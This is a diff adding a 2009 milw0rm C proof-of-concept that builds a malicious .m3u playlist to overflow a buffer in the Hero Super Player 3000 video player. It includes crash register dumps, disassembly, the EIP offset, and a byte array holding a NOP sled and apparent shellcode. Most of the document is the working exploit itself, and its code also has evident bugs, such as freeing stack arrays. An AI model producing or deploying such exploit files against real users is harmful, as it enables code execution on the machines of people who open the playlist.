@@ -1,0 +1,227 @@
+
+  /******************************************************
+   HERO SUPER PLAYER 3000 .M3U File Buffer Overflow POC *
+   by fl0 fl0w                                          *
+   ******************************************************
+  */
+
+  /********************************************************
+   SOFTWARE INFORMATION                                   *  
+   The software video player supports almost all formats  *
+   and disks, you don't need any other software player to *
+   play various video files. It can make obscure video    *
+   has high definition and completely eliminate alias,    *
+   also supports video desktop, resume playback and       *
+   intellectual bookmark. It also provides audio formats  * 
+   conversion between AC3, MP3, and WAV, including CD     *
+   ripping and video conversion between MPEG4 and AVI.    *
+   ********************************************************
+  */
+  
+  /***************************************
+  DEBUGGING INFORMATION                  *                                               
+  EAX 00000000                           *                                                  
+  ECX 00000000                           *                                                  
+  EDX 7C90E514 ntdll.KiFastSystemCallRet *                                                  
+  EBX 000004ED                           *                                                  
+  ESP 0012ED48                           *                                                  
+  EBP 000004ED                           *                                                  
+  ESI 00000001                           *                                                  
+  EDI 7E42F3C2 USER32.SendMessageA       *                                                  
+  EIP 00414141 Mmxado.00414141           *                                                  
+  ****************************************
+  */                                                                                       
+  
+  /***************************************************************************************
+   ASSEMBLY                                                                              * 
+   00414141   FF7C             ???                                      ; Unknown command*
+   00414143   43               INC EBX                                                   * 
+   00414144   83C9 FF          OR ECX,FFFFFFFF                                           *
+   00414147   EB 46            JMP SHORT Mmxado.0041418F                                 *
+   00414149   3D 21030000      CMP EAX,321                                               *
+                                                                                         * 
+   As you cand see the assembler has no clue what just happend ???                       *
+   ahhahahha ,just kidding                                                               *
+   We own EIP register , just that the assembler copyes 1 NULL byte.                     * 
+   The function Mmxado() causes the bug.                                                 *
+   This is info from Windows DEP                                                         * 
+   AppName: mmxado.exe	 AppVer: 1.0.0.1	 ModName: mmxado.exe                     *  
+   ModVer: 1.0.0.1	 Offset: 00014141                                                *
+   After more tests here is the assembly ,here we identify the origins of the bug        *
+                                                                                         *   
+   0012EB0A   0000             ADD BYTE PTR DS:[EAX],AL                                  *    
+   0012EB0C   3B00             CMP EAX,DWORD PTR DS:[EAX]                                *     
+   012EB0E   0000             ADD BYTE PTR DS:[EAX],AL                                   *      
+   0012EB10   2300             AND EAX,DWORD PTR DS:[EAX]                                *
+   It adds to EAX a value that it cannot handle.                                         * 
+   Then compares the new value with the old one                                          *
+   and it rezults in setting the Z FLAG with 0 as a rezult of false                      *
+   Snip                                                                                  * 
+   Z 0 DS 0023 32bit 0(FFFFFFFF)                                                         *
+   Snip                                                                                  * 
+   The EIP OFFSET is 253 bytes(0xFD).                                                    *
+   ***************************************************************************************       
+  */
+  
+  /*************************************************************************************
+   TECHNICALL INFORMATION                                                              *          
+   Download the software from :                                                        *
+   http://www.download.com/Hero-Super-Player-3000/3000-2139_4-10401910.html?tag=lst-3  *
+   Note :After you open the TestFile click on DelUnselect,that's                       *
+   when the buffer overflow occurs.                                                    *
+   This POC has been tested on MS Windows Xp Sp3 English.                              *
+   This POC has been compiled with DEv-C++ 4.9.9.2                                     *
+   *************************************************************************************
+  */    
+  
+  /*******************************************************************************
+  DEMO                                                                           * 
+  C:\Documents and Settings\Stefan\Desktop>hero.exe                              *
+                                                                                 * 
+  This POC was written for educational purpose.                                  *
+  Use it at your own risk.                                                       *
+  Author will be not be responsible for any damage.                              *
+                                                                                 * 
+        PRESS 1 to CONTINUE                                                      *
+                                                                                 * 
+        PRESS 2 to EXIT                                                          *
+  1                                                                              *      
+  *********************************************************************          *
+                HERO SUPER PLAYER 3000 .M3U File Buffer Overflow POC             *
+  The usage is:                                                                  *
+                All Credits fl0 fl0w                                             * 
+                                                                                 *  
+        -f       FILE                                                            *
+  *********************************************************************          *
+  C:\Documents and Settings\Stefan\Desktop>hero.exe -f test                      *
+        FILE DONE !                                                              *
+        The file is saved in the directory : C:\Documents and Settings\Stefan\De *
+  sktop                                                                          *
+  ********************************************************************************
+  */
+#include "stdio.h"
+#include "stdlib.h"
+#include "string.h"
+#include "windows.h"
+#include "stdint.h"
+#include "getopt.h"
+#include "unistd.h"
+
+#define JUNK_SIZE 0x101 //257 bytes
+#define SIZE 0x400
+			
+ typedef struct Top {
+ uint8_t D;
+ uint8_t I;
+ uint8_t R;          
+         }DIR;
+ typedef struct BOTTOM {
+ uint8_t E;
+ uint8_t X;
+ uint8_t T;
+ uint8_t N;         
+         }EXTENSION;
+         
+  void Usage ()
+   { system("CLS");
+         printf("*********************************************************************\n");
+      fprintf ( stdout , "\t\tHERO SUPER PLAYER 3000 .M3U File Buffer Overflow POC\n");
+     printf("The usage is:\n");
+    
+     fprintf ( stdout , "\t\tAll Credits fl0 fl0w\n");
+         }   
+     void Menu()
+   { fprintf(stderr,
+    "\n"
+    "\t-f       FILE\n"
+    "*********************************************************************"
+    "\n");
+   }          
+                                               
+  uint32_t fletcher32(uint8_t data[SIZE], int16_t len)
+    {
+    uint32_t sum1 = 0xffff, sum2 = 0xffff;
+    while (len) {
+    unsigned tlen = len > 360 ? 360 : len;
+    len -= tlen;
+    do {
+    sum1 += *data++;
+    sum2 += sum1;
+    } while (--tlen);
+    sum1 = (sum1 & 0xffff) + (sum1 >> 16);
+    sum2 = (sum2 & 0xffff) + (sum2 >> 16);
+    }
+    sum1 = (sum1 & 0xffff) + (sum1 >> 16);
+    sum2 = (sum2 & 0xffff) + (sum2 >> 16);
+    return sum2 << 16 | sum1;
+    }
+ 
+ void buildFile(char *fname)
+{   uint8_t JUNK[JUNK_SIZE] = {
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x90, 0x6A, 0x23, 0x59, 0xD9, 
+    0xEE, 0xD9, 0x74, 0x24, 0xF4, 0x5B, 0x81, 0x73, 0x13, 0xEC, 0x61, 0x0E, 0x31, 0x83, 0xEB, 0xFC, 
+    0xE2, 0xF4, 0x10, 0x89, 0x4A, 0x31, 0xEC, 0x61, 0x85, 0x74, 0xD0, 0xEA, 0x72, 0x34, 0x94, 0x60, 
+    0xE1, 0xBA, 0xA3, 0x79, 0x85, 0x6E, 0xCC, 0x60, 0xE5, 0x78, 0x67, 0x55, 0x85, 0x30, 0x02, 0x50, 
+    0xCE, 0xA8, 0x40, 0xE5, 0xCE, 0x45, 0xEB, 0xA0, 0xC4, 0x3C, 0xED, 0xA3, 0xE5, 0xC5, 0xD7, 0x35, 
+    0x2A, 0x35, 0x99, 0x84, 0x85, 0x6E, 0xC8, 0x60, 0xE5, 0x57, 0x67, 0x6D, 0x45, 0xBA, 0xB3, 0x7D, 
+    0x0F, 0xDA, 0x67, 0x7D, 0x85, 0x30, 0x07, 0xE8, 0x52, 0x15, 0xE8, 0xA2, 0x3F, 0xF1, 0x88, 0xEA, 
+    0x4E, 0x01, 0x69, 0xA1, 0x76, 0x3D, 0x67, 0x21, 0x02, 0xBA, 0x9C, 0x7D, 0xA3, 0xBA, 0x84, 0x69, 
+    0xE5, 0x38, 0x67, 0xE1, 0xBE, 0x31, 0xEC, 0x61, 0x85, 0x59, 0xD0, 0x3E, 0x3F, 0xC7, 0x8C, 0x37, 
+    0x87, 0xC9, 0x6F, 0xA1, 0x75, 0x61, 0x84, 0x8E, 0xC0, 0xD1, 0x8C, 0x09, 0x96, 0xCF, 0x66, 0x6F, 
+    0x59, 0xCE, 0x0B, 0x02, 0x6F, 0x5D, 0x8F, 0x4F, 0x6B, 0x49, 0x89, 0x61, 0x0E, 0x31, 0x90, 0x90, 
+    0x90, 0x90, 0x90, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 
+    0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 
+    0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x60, 0x63, 0x63, 
+    0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x63, 0x90, 
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x41, 0x41, 0x41, 
+0x41, 
+ };              
+  uint8_t w[SIZE];
+  uint8_t x[SIZE];
+  //Allocating memory for our 2 structures
+  DIR *Dr;
+  Dr = (DIR*)malloc(sizeof(DIR));
+  EXTENSION *ExT;
+  ExT = (EXTENSION*)malloc(sizeof(EXTENSION));
+  //buildind byte by byte the construction C:\
+  Dr->D = 0x43;
+  Dr->I = 0x3A;
+  Dr->R = 0x5C;
+  memcpy(x, Dr, sizeof(Dr));
+  fletcher32(x, SIZE);
+  //buildind byte by byte the construction .MP3
+  ExT->E = 0x2E;
+  ExT->X = 0x6D;
+  ExT->T = 0x70;
+  ExT->N = 0x33;  
+  memcpy(w, ExT, sizeof(ExT));
+   fletcher32(w, SIZE);
+  //building our special binary .M3U FILE
+  FILE *f;
+  f = fopen(fname, "wb");
+  fwrite(x, sizeof(uint8_t), 3, f);
+  fwrite(JUNK, sizeof(uint8_t), sizeof(JUNK), f);
+  fwrite(w, sizeof(uint8_t), 4, f);
+  fclose(f);  
+  free(x);
+  free(w);
+  }
+  
+int main(int argc, char *argv[])
+{ if(argc < 2) {
+   Usage();       
+   Menu();
+   exit(-1);    }
+  uint8_t b[SIZE];
+  strcpy(b, argv[2]);
+  strcat(b, ".m3u");
+  buildFile(b);
+  printf("\tFILE DONE !\n");
+  char *path;
+  size_t size;
+  path = getcwd(path, size);
+  printf("\tThe file is saved in the directory : %s", path);
+  return 0; 
+}
+
+// milw0rm.com [2009-09-15]
